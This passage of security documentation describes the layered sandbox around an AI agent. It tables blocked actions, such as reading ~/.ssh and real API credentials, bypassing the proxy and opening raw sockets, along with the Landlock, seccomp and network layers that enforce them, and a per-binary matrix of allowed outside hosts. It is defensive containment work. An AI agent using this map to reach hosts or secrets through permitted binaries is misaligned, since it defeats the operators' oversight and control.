| Run Python scripts | Subprocess execution | Scripts inherit sandbox restrictions |
| Use localhost services | Via loopback | OpenClaw gateway, SQLite, local models |

### What the Agent (node) CANNOT Do

| Action | Why Blocked | Layer |
|--------|-------------|-------|
| Call `integrate.api.nvidia.com` directly | node not in nvidia policy binaries | Layer 3 (Network) |
| Call `api.openai.com` directly | node not in openai policy binaries | Layer 3 (Network) |
| Call `api.telegram.org` directly | node not in telegram policy binaries | Layer 3 (Network) |
| Read `/root/`, `/home/`, `~/.ssh/` | Not in Landlock allowlist | Layer 1 (Filesystem) |
| Write to `/usr/`, `/etc/`, `/lib/` | Landlock read-only | Layer 1 (Filesystem) |
| Open raw network sockets | seccomp blocks AF_PACKET | Layer 2 (Process) |
| Manipulate routing tables | seccomp blocks AF_NETLINK | Layer 2 (Process) |
| Bypass proxy | Network namespace forces all traffic through veth | Layer 3 (Network) |
| Read real API credentials | Only placeholder strings in env | Layer 4 (Provider) |
| Call arbitrary HTTPS endpoints | Must match policy binary+endpoint pair | Layer 3 (Network) |

### Binary Access Matrix

| Binary | NVIDIA API | Anthropic API | Telegram | Discord | HuggingFace | PyPI | GitHub | inference.local |
|--------|-----------|--------------|----------|---------|-------------|------|--------|----------------|
| `/usr/bin/node` | - | - (only via claude ancestor) | - | - | - | - | - | Via proxy (any) |
| `/usr/local/bin/claude` | - | api.anthropic.com | - | - | - | - | api.github.com | Via proxy (any) |
| `/usr/bin/curl` | integrate.api.nvidia.com | - | api.telegram.org | discord.com | huggingface.co | - | - | - |
| `/usr/bin/python3` | integrate.api.nvidia.com | - | - | - | - | - | - | - |
| `/sandbox/.venv/bin/python*` | - | - | api.telegram.org | discord.com, gateway.discord.gg | huggingface.co, cdn-lfs.huggingface.co | pypi.org, files.pythonhosted.org | - | - |
| `/usr/bin/git` | - | - | - | - | - | - | github.com (read-only) | - |
| `/usr/local/bin/uv` | - | - | - | - | huggingface.co | pypi.org, files.pythonhosted.org | - | - |

The `-` means access is DENIED. This matrix is the ground truth of the security model.
